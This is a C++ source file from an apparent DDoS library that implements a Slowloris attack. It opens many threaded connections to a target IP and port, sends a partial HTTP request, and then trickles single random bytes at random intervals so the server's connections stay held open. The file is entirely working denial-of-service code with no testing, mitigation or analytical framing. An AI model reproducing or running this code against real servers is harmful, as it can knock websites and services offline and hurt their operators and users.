//
// Created by mao on 17-11-14.
//

#include "Slowloris.h"
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <iostream>
#include <arpa/inet.h>

const char *get_message = "GET / HTTP/1.1\r\n";

void Slowloris::loris() {
    struct sockaddr_in socket_address_descriptor;
    int socket_descriptor;
    init_socket(socket_descriptor, socket_address_descriptor, args.target_ip, args.target_port);

    int connect_success = connect(socket_descriptor, (struct sockaddr *) &socket_address_descriptor,
                                  sizeof(socket_address_descriptor));
    if (connect_success < 0) {
        perror("[SLOWLORIS] error in connect() ");
        return;
    }

    ssize_t http_succes = send(socket_descriptor, get_message, strlen(get_message), 0);
    if (http_succes >= 0) {
        struct timespec sleep_structure{};
        sleep_structure.tv_sec = 0;
        int count = 0;
        while (true) {
            count++;
            auto dummy_character = (char) ((56 * (rand() / (RAND_MAX + 1.0))) + 65);
            std::cout << ".";
            if (count >= 10) {
                count = 0;
                std::cout.flush();
            }
            send(socket_descriptor, (const char *) &dummy_character, 1, 0);

            auto milisecond = static_cast<int>(999 * (rand() / (RAND_MAX + 1.0)));
            sleep_structure.tv_nsec = (milisecond * 1000000L);

            if (nanosleep((const struct timespec *) &sleep_structure, (struct timespec *) nullptr) < 0) {
                perror("[SLOWLORIS] error in nanosleep()\n");
                break;
            }

        }
    }
    /*
     * Close the socket and stop receiving and sending data.
     */
    shutdown(socket_descriptor, SHUT_RDWR);
    std::cout << "SHUTDOWN" << std::endl;
}

Slowloris::Slowloris(const arg_bundle &args) : DDosLibrary(args) {}


void Slowloris::run() {
    srand(static_cast<unsigned int>(time(nullptr)));

    if (this->args.target_ip == nullptr) {
        return;
    }

    for (int i = 0; i < args.thread_num; ++i) {
        std::thread t(&Slowloris::loris, this);
        threads.push_back(std::move(t));
    }

    for (int j = 0; j < threads.size(); ++j) {
        threads.at(static_cast<unsigned long>(j)).join();
    }
}